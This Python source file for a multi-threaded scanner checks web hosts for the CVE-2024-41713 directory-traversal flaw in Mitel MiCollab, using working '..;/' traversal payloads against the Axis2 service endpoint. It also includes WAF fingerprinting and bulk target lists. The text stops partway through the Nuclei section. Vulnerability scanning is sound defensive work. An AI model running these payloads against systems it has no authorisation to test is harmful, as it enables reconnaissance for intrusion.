#!/usr/bin/env python3
"""
CVE-2024-41713 Scanner - Advanced Directory Traversal Vulnerability Detector
"""

import argparse
import concurrent.futures
import csv
import hashlib
import json
import os
import re
import sys
import time
import urllib3
from dataclasses import dataclass, asdict, field
from datetime import datetime
from pathlib import Path
from typing import Optional
from urllib.parse import urlparse

import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

# Disable SSL warnings when verification is disabled
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Version
__version__ = "2.1.0"


# ANSI color codes
class Colors:
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    BLUE = "\033[94m"
    MAGENTA = "\033[95m"
    CYAN = "\033[96m"
    WHITE = "\033[97m"
    BOLD = "\033[1m"
    RESET = "\033[0m"

    @classmethod
    def disable(cls):
        """Disable colors for non-TTY output."""
        cls.RED = cls.GREEN = cls.YELLOW = cls.BLUE = ""
        cls.MAGENTA = cls.CYAN = cls.WHITE = cls.BOLD = cls.RESET = ""


@dataclass
class ScanResult:
    """Represents the result of a vulnerability scan."""
    target: str
    vulnerable: bool
    payload: Optional[str] = None
    status_code: Optional[int] = None
    response_length: Optional[int] = None
    response_snippet: Optional[str] = None
    response_time: Optional[float] = None
    server_header: Optional[str] = None
    waf_detected: Optional[str] = None
    error: Optional[str] = None
    timestamp: str = ""
    request_hash: str = ""

    def __post_init__(self):
        if not self.timestamp:
            self.timestamp = datetime.now().isoformat()
        if not self.request_hash:
            self.request_hash = hashlib.md5(f"{self.target}{self.timestamp}".encode()).hexdigest()[:8]


@dataclass
class ScanConfig:
    """Configuration for the scanner."""
    timeout: int = 10
    verify_ssl: bool = True
    user_agent: str = None
    all_payloads: bool = False
    verbose: bool = False
    proxy: str = None
    cookies: dict = field(default_factory=dict)
    headers: dict = field(default_factory=dict)
    rate_limit: float = 0
    retries: int = 3
    follow_redirects: bool = False
    method: str = "GET"
    match_regex: str = None
    exclude_regex: str = None


# Multiple payloads to test various bypass techniques
PAYLOADS = [
    "/npm-pwg/..;/axis2-AWC/services/listServices",
    "/npm-pwg/..;/axis2-AWC/services",
    "/npm-pwg/..;/axis2/services/listServices",
    "/npm-pwg/..%3B/axis2-AWC/services/listServices",
    "/npm-pwg/%2e%2e;/axis2-AWC/services/listServices",
    "/npm-pwg/..;/..;/axis2-AWC/services/listServices",
]

# Indicators that suggest vulnerability
VULNERABILITY_INDICATORS = [
    "<ServiceList>",
    "<service>",
    "axis2",
    "listServices",
    "<wsdl:",
    "xmlns:axis2",
]

# WAF signatures for detection
WAF_SIGNATURES = {
    "Cloudflare": ["cf-ray", "cloudflare", "__cfduid"],
    "AWS WAF": ["awswaf", "x-amzn-waf"],
    "Akamai": ["akamai", "x-akamai"],
    "Imperva": ["incapsula", "x-iinfo", "visid_incap"],
    "F5 BIG-IP": ["x-wa-info", "bigip", "f5"],
    "ModSecurity": ["mod_security", "modsecurity"],
    "Fortinet": ["fortigate", "fortiwaF"],
    "Barracuda": ["barracuda", "barra_counter"],
    "Sucuri": ["sucuri", "x-sucuri"],
    "Wordfence": ["wordfence"],
}

# Common server fingerprints
SERVER_FINGERPRINTS = {
    "mitel": "Mitel MiCollab/MiVoice",
    "apache": "Apache HTTP Server",
    "nginx": "Nginx",
    "iis": "Microsoft IIS",
    "tomcat": "Apache Tomcat",
}


def print_banner():
    """Print the scanner banner."""
    banner = f"""
{Colors.CYAN}{Colors.BOLD}
   ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ïó   ‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó    ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó  ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó ‚ñà‚ñà‚ïó  ‚ñà‚ñà‚ïó     ‚ñà‚ñà‚ïó  ‚ñà‚ñà‚ïó ‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó ‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó 
  ‚ñà‚ñà‚ïî‚ïê‚ïê‚ïê‚ïê‚ïù‚ñà‚ñà‚ïë   ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïî‚ïê‚ïê‚ïê‚ïê‚ïù    ‚ïö‚ïê‚ïê‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ïî‚ïê‚ïê‚ïê‚ñà‚ñà‚ïó‚ïö‚ïê‚ïê‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïë     ‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïë‚ñà‚ñà‚ñà‚ïë‚ïö‚ïê‚ïê‚ïê‚ïê‚ñà‚ñà‚ïë‚ñà‚ñà‚ñà‚ïë‚ïö‚ïê‚ïê‚ïê‚ïê‚ñà‚ñà‚ïó
  ‚ñà‚ñà‚ïë     ‚ñà‚ñà‚ïë   ‚ñà‚ñà‚ïë‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó ‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù‚ñà‚ñà‚ïë   ‚ñà‚ñà‚ïë ‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïë     ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïë‚ïö‚ñà‚ñà‚ïë    ‚ñà‚ñà‚ïî‚ïù‚ïö‚ñà‚ñà‚ïë ‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù
  ‚ñà‚ñà‚ïë     ‚ïö‚ñà‚ñà‚ïó ‚ñà‚ñà‚ïî‚ïù‚ñà‚ñà‚ïî‚ïê‚ïê‚ïù‚ïö‚ïê‚ïê‚ïê‚ïê‚ïù‚ñà‚ñà‚ïî‚ïê‚ïê‚ïê‚ïù ‚ñà‚ñà‚ïë   ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïî‚ïê‚ïê‚ïê‚ïù ‚ïö‚ïê‚ïê‚ïê‚ïê‚ñà‚ñà‚ïë     ‚ïö‚ïê‚ïê‚ïê‚ïê‚ñà‚ñà‚ïë ‚ñà‚ñà‚ïë   ‚ñà‚ñà‚ïî‚ïù  ‚ñà‚ñà‚ïë ‚ïö‚ïê‚ïê‚ïê‚ñà‚ñà‚ïó
  ‚ïö‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó ‚ïö‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó    ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ïö‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó     ‚ñà‚ñà‚ïë          ‚ñà‚ñà‚ïë ‚ñà‚ñà‚ïë   ‚ñà‚ñà‚ïë   ‚ñà‚ñà‚ïë‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù
   ‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù  ‚ïö‚ïê‚ïê‚ïê‚ïù  ‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù    ‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù ‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù ‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù     ‚ïö‚ïê‚ïù          ‚ïö‚ïê‚ïù ‚ïö‚ïê‚ïù   ‚ïö‚ïê‚ïù   ‚ïö‚ïê‚ïù‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù 
{Colors.RESET}
{Colors.YELLOW}  Directory Traversal Vulnerability Scanner{Colors.RESET}
{Colors.WHITE}  Version: {__version__} | github.com/your-username/CVE-2024-41713{Colors.RESET}
"""
    print(banner)


def print_status(message: str, status: str = "info", quiet: bool = False):
    """Print a status message with color coding."""
    if quiet and status not in ["vuln", "error"]:
        return
    icons = {
        "info": (Colors.BLUE, "[*]"),
        "success": (Colors.GREEN, "[+]"),
        "warning": (Colors.YELLOW, "[!]"),
        "error": (Colors.RED, "[-]"),
        "vuln": (Colors.RED + Colors.BOLD, "[VULN]"),
        "debug": (Colors.MAGENTA, "[D]"),
    }
    color, icon = icons.get(status, (Colors.WHITE, "[*]"))
    print(f"{color}{icon}{Colors.RESET} {message}")


def detect_waf(headers: dict, body: str) -> Optional[str]:
    """Detect if a WAF is present based on response headers and body."""
    combined = str(headers).lower() + body.lower()
    for waf_name, signatures in WAF_SIGNATURES.items():
        for sig in signatures:
            if sig.lower() in combined:
                return waf_name
    return None


def detect_server(headers: dict) -> Optional[str]:
    """Detect server type from headers."""
    server = headers.get("Server", "").lower()
    for fingerprint, name in SERVER_FINGERPRINTS.items():
        if fingerprint in server:
            return name
    return headers.get("Server") or "Unknown"


def create_session(config: ScanConfig) -> requests.Session:
    """Create a requests session with retry logic and configuration."""
    session = requests.Session()
    
    # Configure retries
    retry_strategy = Retry(
        total=config.retries,
        backoff_factor=0.5,
        status_forcelist=[429, 500, 502, 503, 504],
        allowed_methods=["GET", "POST", "HEAD"],
    )
    adapter = HTTPAdapter(max_retries=retry_strategy)
    session.mount("http://", adapter)
    session.mount("https://", adapter)
    
    # Configure proxy
    if config.proxy:
        session.proxies = {
            "http": config.proxy,
            "https": config.proxy,
        }
    
    # Configure cookies
    if config.cookies:
        session.cookies.update(config.cookies)
    
    return session


def load_payloads_from_file(filepath: str) -> list:
    """Load custom payloads from a file."""
    try:
        with open(filepath, "r") as f:
            custom_payloads = [line.strip() for line in f if line.strip() and not line.startswith("#")]
        return custom_payloads
    except FileNotFoundError:
        print_status(f"Payload file not found: {filepath}", "error")
        return []


def parse_cookies(cookie_string: str) -> dict:
    """Parse cookie string into dictionary."""
    cookies = {}
    if cookie_string:
        for item in cookie_string.split(";"):
            if "=" in item:
                key, value = item.strip().split("=", 1)
                cookies[key.strip()] = value.strip()
    return cookies


def parse_headers(header_list: list) -> dict:
    """Parse header list into dictionary."""
    headers = {}
    if header_list:
        for item in header_list:
            if ":" in item:
                key, value = item.split(":", 1)
                headers[key.strip()] = value.strip()
    return headers


def validate_url(url: str) -> bool:
    """Validate if a URL is properly formatted."""
    try:
        result = urlparse(url)
        return all([result.scheme, result.netloc])
    except Exception:
        return False


def generate_html_report(results: list, output_file: str):
    """Generate an HTML report of scan results."""
    vulnerable = [r for r in results if r.vulnerable]
    safe = [r for r in results if not r.vulnerable and not r.error]
    errors = [r for r in results if r.error]
    
    html_template = f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CVE-2024-41713 Scan Report</title>
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{ font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #1a1a2e; color: #eee; padding: 20px; }}
        .container {{ max-width: 1200px; margin: 0 auto; }}
        h1 {{ color: #00d4ff; text-align: center; margin-bottom: 30px; font-size: 2.5em; }}
        .summary {{ display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin-bottom: 30px; }}
        .card {{ background: #16213e; padding: 20px; border-radius: 10px; text-align: center; }}
        .card h3 {{ font-size: 2em; margin-bottom: 10px; }}
        .card.vuln h3 {{ color: #ff4757; }}
        .card.safe h3 {{ color: #2ed573; }}
        .card.error h3 {{ color: #ffa502; }}
        .card.total h3 {{ color: #00d4ff; }}
        table {{ width: 100%; border-collapse: collapse; margin-top: 20px; }}
        th, td {{ padding: 12px; text-align: left; border-bottom: 1px solid #333; }}
        th {{ background: #16213e; color: #00d4ff; }}
        tr:hover {{ background: #16213e; }}
        .status-vuln {{ color: #ff4757; font-weight: bold; }}
        .status-safe {{ color: #2ed573; }}
        .status-error {{ color: #ffa502; }}
        .payload {{ font-family: monospace; font-size: 0.9em; color: #a4b0be; }}
        .timestamp {{ color: #747d8c; font-size: 0.9em; }}
        .footer {{ text-align: center; margin-top: 40px; color: #747d8c; }}
        .section {{ margin-top: 30px; }}
        .section h2 {{ color: #00d4ff; margin-bottom: 15px; border-bottom: 2px solid #00d4ff; padding-bottom: 10px; }}
        pre {{ background: #0f0f23; padding: 15px; border-radius: 5px; overflow-x: auto; font-size: 0.85em; }}
    </style>
</head>
<body>
    <div class="container">
        <h1>üîç CVE-2024-41713 Scan Report</h1>
        
        <div class="summary">
            <div class="card total"><h3>{len(results)}</h3><p>Total Scanned</p></div>
            <div class="card vuln"><h3>{len(vulnerable)}</h3><p>Vulnerable</p></div>
            <div class="card safe"><h3>{len(safe)}</h3><p>Not Vulnerable</p></div>
            <div class="card error"><h3>{len(errors)}</h3><p>Errors</p></div>
        </div>
        
        <div class="section">
            <h2>üìä Scan Results</h2>
            <table>
                <thead>
                    <tr>
                        <th>Target</th>
                        <th>Status</th>
                        <th>Payload</th>
                        <th>Response</th>
                        <th>Server</th>
                        <th>WAF</th>
                    </tr>
                </thead>
                <tbody>
                    {"".join(f'''<tr>
                        <td>{r.target}</td>
                        <td class="status-{'vuln' if r.vulnerable else 'error' if r.error else 'safe'}">
                            {'VULNERABLE' if r.vulnerable else 'ERROR' if r.error else 'Safe'}
                        </td>
                        <td class="payload">{r.payload or '-'}</td>
                        <td>{r.status_code or '-'} ({r.response_length or 0} bytes)</td>
                        <td>{r.server_header or '-'}</td>
                        <td>{r.waf_detected or '-'}</td>
                    </tr>''' for r in results)}
                </tbody>
            </table>
        </div>
        
        {"".join(f'''<div class="section">
            <h2>üö® Vulnerable: {r.target}</h2>
            <p><strong>Payload:</strong> <code>{r.payload}</code></p>
            <p><strong>Response Time:</strong> {r.response_time or 0:.2f}s</p>
            <pre>{r.response_snippet}</pre>
        </div>''' for r in vulnerable if r.response_snippet)}
        
        <div class="footer">
            <p>Generated on {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} | CVE-2024-41713 Scanner v{__version__}</p>
        </div>
    </div>
</body>
</html>"""
    
    with open(output_file, "w") as f:
        f.write(html_template)


def save_resume_state(targets: list, completed: list, output_file: str):
    """Save scan state for resume capability."""
    state = {
        "remaining": [t for t in targets if t not in completed],
        "completed": completed,
        "timestamp": datetime.now().isoformat(),
    }
    with open(output_file, "w") as f:
        json.dump(state, f, indent=2)


def load_resume_state(state_file: str) -> tuple:
    """Load previous scan state."""
    try:
        with open(state_file, "r") as f:
            state = json.load(f)
        return state.get("remaining", []), state.get("completed", [])
    except (FileNotFoundError, json.JSONDecodeError):
        return [], []


def scan_target(
    target_url: str,
    config: ScanConfig = None,
    session: requests.Session = None,
    custom_payloads: list = None,
) -> ScanResult:
    """
    Scan a target URL for CVE-2024-41713 vulnerability.
    
    Args:
        target_url: The target URL to scan
        config: ScanConfig object with all settings
        session: Optional requests session to use
        custom_payloads: Optional list of custom payloads
    
    Returns:
        ScanResult object with scan results
    """
    if config is None:
        config = ScanConfig()
    
    target_url = target_url.strip().rstrip("/")
    
    # Ensure URL has a scheme
    if not target_url.startswith(("http://", "https://")):
        target_url = f"http://{target_url}"

    headers = {
        "User-Agent": config.user_agent or "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "*/*",
        "Connection": "close",
    }
    
    # Add custom headers
    headers.update(config.headers)
    
    # Use provided session or create a new one
    if session is None:
        session = create_session(config)
    
    # Use custom payloads or defaults
    payloads_to_test = custom_payloads if custom_payloads else PAYLOADS
    
    waf_detected = None
    server_header = None

    for payload in payloads_to_test:
        test_url = target_url + payload
        
        if config.verbose:
            print_status(f"Testing: {test_url}", "debug")
        
        # Rate limiting
        if config.rate_limit > 0:
            time.sleep(config.rate_limit)
        
        try:
            start_time = time.time()
            
            # Choose HTTP method
            if config.method.upper() == "POST":
                response = session.post(
                    test_url,
                    headers=headers,
                    timeout=config.timeout,
                    verify=config.verify_ssl,
                    allow_redirects=config.follow_redirects,
                )
            elif config.method.upper() == "HEAD":
                response = session.head(
                    test_url,
                    headers=headers,
                    timeout=config.timeout,
                    verify=config.verify_ssl,
                    allow_redirects=config.follow_redirects,
                )
            else:
                response = session.get(
                    test_url,
                    headers=headers,
                    timeout=config.timeout,
                    verify=config.verify_ssl,
                    allow_redirects=config.follow_redirects,
                )
            
            response_time = time.time() - start_time
            
            # Detect WAF and server
            if waf_detected is None:
                waf_detected = detect_waf(dict(response.headers), response.text)
            if server_header is None:
                server_header = detect_server(dict(response.headers))
            
            # Check for vulnerability indicators
            is_vulnerable = False
            if response.status_code == 200:
                response_text = response.text
                
                # Custom regex matching
                if config.match_regex:
                    if re.search(config.match_regex, response_text, re.IGNORECASE):
                        is_vulnerable = True
                elif config.exclude_regex:
                    if not re.search(config.exclude_regex, response_text, re.IGNORECASE):
                        is_vulnerable = True
                else:
                    # Default indicator check
                    response_lower = response_text.lower()
                    for indicator in VULNERABILITY_INDICATORS:
                        if indicator.lower() in response_lower:
                            is_vulnerable = True
                            break
            
            if is_vulnerable:
                return ScanResult(
                    target=target_url,
                    vulnerable=True,
                    payload=payload,
                    status_code=response.status_code,
                    response_length=len(response.text),
                    response_snippet=response.text[:500],
                    response_time=response_time,
                    server_header=server_header,
                    waf_detected=waf_detected,
                )
            
            if not config.all_payloads:
                continue
                
        except requests.exceptions.Timeout:
            if config.verbose:
                print_status(f"Timeout for {test_url}", "warning")
        except requests.exceptions.SSLError as e:
            if config.verbose:
                print_status(f"SSL Error: {e}", "error")
            return ScanResult(
                target=target_url, 
                vulnerable=False, 
                error=f"SSL Error: {e}",
                server_header=server_header,
                waf_detected=waf_detected,
            )
        except requests.exceptions.ProxyError as e:
            if config.verbose:
                print_status(f"Proxy Error: {e}", "error")
            return ScanResult(target=target_url, vulnerable=False, error=f"Proxy Error: {e}")
        except requests.exceptions.RequestException as e:
            if config.verbose:
                print_status(f"Request error: {e}", "error")
            return ScanResult(
                target=target_url, 
                vulnerable=False, 
                error=str(e),
                server_header=server_header,
                waf_detected=waf_detected,
            )

    return ScanResult(
        target=target_url, 
        vulnerable=False,
        server_header=server_header,
        waf_detected=waf_detected,
    )


def scan_multiple_targets(
    targets: list,
    config: ScanConfig = None,
    threads: int = 10,
    custom_payloads: list = None,
    quiet: bool = False,
    resume_file: str = None,
) -> list:
    """
    Scan multiple targets concurrently.
    
    Args:
        targets: List of target URLs
        config: ScanConfig object with settings
        threads: Number of concurrent threads
        custom_payloads: Optional custom payloads list
        quiet: Suppress non-critical output
        resume_file: File to save/load resume state
    
    Returns:
        List of ScanResult objects
    """
    if config is None:
        config = ScanConfig()
    
    results = []
    completed_targets = []
    total = len(targets)
    
    # Check for resume state
    if resume_file:
        remaining, previously_completed = load_resume_state(resume_file)
        if remaining:
            print_status(f"Resuming scan with {len(remaining)} remaining targets", "info")
            targets = remaining
            total = len(targets)
    
    if not quiet:
        print_status(f"Starting scan of {total} target(s) with {threads} thread(s)", "info")
        if config.proxy:
            print_status(f"Using proxy: {config.proxy}", "info")
        if config.rate_limit > 0:
            print_status(f"Rate limit: {config.rate_limit}s between requests", "info")
        print()
    
    # Create a shared session
    session = create_session(config)
    
    try:
        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
            future_to_target = {
                executor.submit(scan_target, target, config, session, custom_payloads): target
                for target in targets
            }
            
            for i, future in enumerate(concurrent.futures.as_completed(future_to_target), 1):
                target = future_to_target[future]
                try:
                    result = future.result()
                    results.append(result)
                    completed_targets.append(target)
                    
                    # Print result
                    progress = f"[{i}/{total}]"
                    if result.vulnerable:
                        print_status(
                            f"{progress} {Colors.RED}VULNERABLE{Colors.RESET}: {result.target}",
                            "vuln",
                            quiet
                        )
                        if not quiet:
                            print(f"    ‚îú‚îÄ Payload: {result.payload}")
                            print(f"    ‚îú‚îÄ Response Length: {result.response_length}")
                            print(f"    ‚îú‚îÄ Response Time: {result.response_time:.2f}s")
                            if result.server_header:
                                print(f"    ‚îú‚îÄ Server: {result.server_header}")
                            if result.waf_detected:
                                print(f"    ‚îî‚îÄ WAF Detected: {result.waf_detected}")
                            else:
                                print(f"    ‚îî‚îÄ WAF: None detected")
                    elif result.error:
                        print_status(f"{progress} ERROR: {result.target} - {result.error}", "error", quiet)
                    else:
                        if not quiet:
                            extra = ""
                            if result.waf_detected:
                                extra = f" (WAF: {result.waf_detected})"
                            print_status(f"{progress} Not vulnerable: {result.target}{extra}", "success")
                    
                    # Save resume state periodically
                    if resume_file and i % 10 == 0:
                        save_resume_state(targets, completed_targets, resume_file)
                        
                except Exception as e:
                    print_status(f"Error processing {target}: {e}", "error", quiet)
                    results.append(ScanResult(target=target, vulnerable=False, error=str(e)))
    
    except KeyboardInterrupt:
        print_status("\nScan interrupted by user", "warning")
        if resume_file:
            save_resume_state(targets, completed_targets, resume_file)
            print_status(f"Progress saved to {resume_file}. Resume with --resume", "info")
    
    return results


def save_results(results: list, output_file: str, format: str = "json"):
    """Save scan results to a file."""
    output_path = Path(output_file)
    
    if format == "json":
        with open(output_path, "w") as f:
            json.dump([asdict(r) for r in results], f, indent=2)
    elif format == "csv":
        with open(output_path, "w", newline="") as f:
            writer = csv.DictWriter(f, fieldnames=asdict(results[0]).keys())
            writer.writeheader()
            for result in results:
                writer.writerow(asdict(result))
    elif format == "txt":
        with open(output_path, "w") as f:
            for result in results:
                status = "VULNERABLE" if result.vulnerable else "Not Vulnerable"
                f.write(f"{result.target} - {status}\n")
                if result.vulnerable:
                    f.write(f"  Payload: {result.payload}\n")
                    f.write(f"  Response Length: {result.response_length}\n")
                if result.error:
                    f.write(f"  Error: {result.error}\n")
                f.write("\n")
    elif format == "html":
        generate_html_report(results, output_file)
    
    print_status(f"Results saved to: {output_path}", "success")


def print_summary(results: list, quiet: bool = False):
    """Print a summary of scan results."""
    if quiet:
        return
    
    total = len(results)
    vulnerable = sum(1 for r in results if r.vulnerable)
    errors = sum(1 for r in results if r.error)
    safe = total - vulnerable - errors
    wafs_detected = set(r.waf_detected for r in results if r.waf_detected)
    
    print()
    print(f"{Colors.BOLD}{'='*60}{Colors.RESET}")
    print(f"{Colors.BOLD}SCAN SUMMARY{Colors.RESET}")
    print(f"{'='*60}")
    print(f"  Total Targets:  {total}")
    print(f"  {Colors.RED}Vulnerable:     {vulnerable}{Colors.RESET}")
    print(f"  {Colors.GREEN}Not Vulnerable: {safe}{Colors.RESET}")
    print(f"  {Colors.YELLOW}Errors:         {errors}{Colors.RESET}")
    if wafs_detected:
        print(f"  {Colors.CYAN}WAFs Detected:  {', '.join(wafs_detected)}{Colors.RESET}")
    print(f"{'='*60}")
    
    if vulnerable > 0:
        print(f"\n{Colors.RED}{Colors.BOLD}Vulnerable Targets:{Colors.RESET}")
        for result in results:
            if result.vulnerable:
                print(f"  ‚Ä¢ {result.target}")
                print(f"    Payload: {result.payload}")


def main():
    parser = argparse.ArgumentParser(
        description="CVE-2024-41713 Directory Traversal Vulnerability Scanner",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s -u http://target.com
  %(prog)s -u http://target.com -v --all-payloads
  %(prog)s -f targets.txt -t 20 -o results.json
  %(prog)s -u http://target.com --no-ssl-verify
  %(prog)s -f targets.txt --proxy http://127.0.0.1:8080
  %(prog)s -u http://target.com -H "Authorization: Bearer token"
  %(prog)s -f targets.txt --rate-limit 0.5 --resume
  %(prog)s -u http://target.com --payloads custom_payloads.txt
  %(prog)s -f targets.txt -o report.html --format html
  
Nuclei Mode:
  %(prog)s -u http://target.com --nuclei
  %(prog)s -f targets.txt --nuclei --nuclei-rate-limit 100
  %(prog)s -u http://target.com --nuclei --nuclei-template custom.yaml
        """,
    )
    
    # Target options
    target_group = parser.add_mutually_exclusive_group()
    target_group.add_argument(
        "-u", "--url",
        help="Single target URL to scan",
    )
    target_group.add_argument(
        "-f", "--file",
        help="File containing list of target URLs (one per line)",
    )
    
    # Request options
    request_group = parser.add_argument_group("Request Options")
    request_group.add_argument(
        "-t", "--threads",
        type=int,
        default=10,
        help="Number of concurrent threads (default: 10)",
    )
    request_group.add_argument(
        "--timeout",
        type=int,
        default=10,
        help="Request timeout in seconds (default: 10)",
    )
    request_group.add_argument(
        "--no-ssl-verify",
        action="store_true",
        help="Disable SSL certificate verification",
    )
    request_group.add_argument(
        "--user-agent",
        help="Custom User-Agent string",
    )
    request_group.add_argument(
        "--proxy",
        help="Proxy URL (e.g., http://127.0.0.1:8080)",
    )
    request_group.add_argument(
        "-H", "--header",
        action="append",
        dest="headers",
        help="Custom header (can be used multiple times). Format: 'Name: Value'",
    )
    request_group.add_argument(
        "-c", "--cookie",
        help="Cookies to send with requests. Format: 'name1=value1; name2=value2'",
    )
    request_group.add_argument(
        "--method",
        choices=["GET", "POST", "HEAD"],
        default="GET",
        help="HTTP method to use (default: GET)",
    )
    request_group.add_argument(
        "--follow-redirects",
        action="store_true",
        help="Follow HTTP redirects",
    )
    request_group.add_argument(
        "--retries",
        type=int,
        default=3,
        help="Number of retries for failed requests (default: 3)",
    )
    request_group.add_argument(
        "--rate-limit",
        type=float,
        default=0,
        help="Delay between requests in seconds (default: 0)",
    )
    
    # Payload options
    payload_group = parser.add_argument_group("Payload Options")
    payload_group.add_argument(
        "--all-payloads",
        action="store_true",
        help="Test all payloads (don't stop at first match)",
    )
    payload_group.add_argument(
        "--payloads",
        help="File containing custom payloads (one per line)",
    )
    payload_group.add_argument(
        "--match-regex",
        help="Custom regex to match for vulnerability detection",
    )
    payload_group.add_argument(
        "--exclude-regex",
        help="Exclude responses matching this regex from being marked vulnerable",
    )
    
    # Output options
    output_group = parser.add_argument_group("Output Options")
    output_group.add_argument(
        "-o", "--output",
        help="Output file to save results",
    )
    output_group.add_argument(
        "--format",
        choices=["json", "csv", "txt", "html"],
        default="json",
        help="Output format (default: json)",
    )
    output_group.add_argument(
        "-v", "--verbose",
        action="store_true",
        help="Enable verbose output",
    )
    output_group.add_argument(
        "-q", "--quiet",
        action="store_true",
        help="Quiet mode - only show vulnerabilities and errors",
    )
    output_group.add_argument(
        "--no-color",
        action="store_true",
        help="Disable colored output",
    )
    output_group.add_argument(
        "--no-banner",
        action="store_true",
        help="Don't print the banner",
    )
    
    # Resume options
    resume_group = parser.add_argument_group("Resume Options")
    resume_group.add_argument(
        "--resume",
        action="store_true",
        help="Resume a previous scan from state file",
    )
    resume_group.add_argument(
        "--resume-file",
        default=".cve_scan_state.json",
        help="State file for resume capability (default: .cve_scan_state.json)",
    )
    
    # Nuclei options
    nuclei_group = parser.add_argument_group("Nuclei Integration")
    nuclei_group.add_argument(
        "--nuclei",
        action="store_true",
        help="Use Nuclei scanner instead of built-in scanner",
    )
    nuclei_group.add_argument(
        "--nuclei-template",
        help="Custom Nuclei template path (default: built-in CVE-2024-41713 template)",
    )
    nuclei_group.add_argument(
        "--nuclei-rate-limit",
        type=int,
        default=150,
        help="Nuclei requests per second (default: 150)",
    )
    nuclei_group.add_argument(
        "--nuclei-concurrency",
        type=int,
        default=25,
        help="Nuclei concurrent requests (default: 25)",
    )
    nuclei_group.add_argument(
        "--nuclei-check",
        action="store_true",
        help="Check if Nuclei is installed and exit",
    )
    
    # Other options
    parser.add_argument(
        "--version",
        action="version",
        version=f"%(prog)s {__version__}",
    )
    
    args = parser.parse_args()
    
    # Handle color settings
    if args.no_color or not sys.stdout.isatty():
        Colors.disable()
    
    # Check Nuclei installation
    if args.nuclei_check:
        try:
            from nuclei_integration import check_nuclei_installed, get_nuclei_version
            if check_nuclei_installed():
                version = get_nuclei_version()
                print_status(f"Nuclei is installed: {version}", "success")
            else:
                print_status("Nuclei is not installed", "error")
                print("  Install: go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest")
        except ImportError:
            print_status("Nuclei integration module not found", "error")
        sys.exit(0)
    
    # Print banner
    if not args.no_banner and not args.quiet:
        print_banner()
    
    # Load custom payloads if specified
    custom_payloads = None
    if args.payloads:
        custom_payloads = load_payloads_from_file(args.payloads)
        if custom_payloads:
            print_status(f"Loaded {len(custom_payloads)} custom payloads", "info")
    
    # Collect targets
    targets = []
    if args.url:
        targets = [args.url]
    elif args.file:
        try:
            with open(args.file, "r") as f:
                targets = [line.strip() for line in f if line.strip() and not line.startswith("#")]
        except FileNotFoundError:
            print_status(f"File not found: {args.file}", "error")
            sys.exit(1)
    elif args.resume:
        remaining, _ = load_resume_state(args.resume_file)
        if remaining:
            targets = remaining
            print_status(f"Resuming with {len(targets)} remaining targets", "info")
        else:
            print_status("No resume state found or all targets completed", "error")
            sys.exit(1)
    else:
        # Interactive mode
        print_status("No target specified. Enter target URL(s):", "info")
        print("  (Enter one URL per line, press Ctrl+D or enter empty line to start scan)")
        print()
        try:
            while True:
                url = input(f"  {Colors.CYAN}>{Colors.RESET} ").strip()
                if not url:
                    break
                targets.append(url)
        except EOFError:
            pass
    
    if not targets:
        print_status("No targets provided. Exiting.", "error")
        sys.exit(1)
    
    # Nuclei mode
    if args.nuclei:
        try:
            from nuclei_integration import (
                check_nuclei_installed, 
                run_nuclei_scan, 
                convert_nuclei_to_scan_result,
                NucleiResult
            )
            
            if not check_nuclei_installed():
                print_status("Nuclei is not installed", "error")
                print("  Install: go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest")
                sys.exit(1)
            
